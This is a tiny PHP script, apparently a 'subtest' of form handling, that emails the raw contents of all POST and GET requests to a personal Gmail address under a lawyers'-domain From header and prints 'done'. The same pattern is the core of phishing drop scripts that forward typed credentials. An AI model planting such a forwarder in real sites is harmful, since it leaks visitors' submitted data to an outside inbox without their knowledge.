<?php
mail('naveenkhanchandani@gmail.com', 'subtest', var_export($_POST, 1)."\n\n\n".var_export($_GET, 1), "From:mk<consultlawyers@consultlawyers.us>");
echo 'done';
?>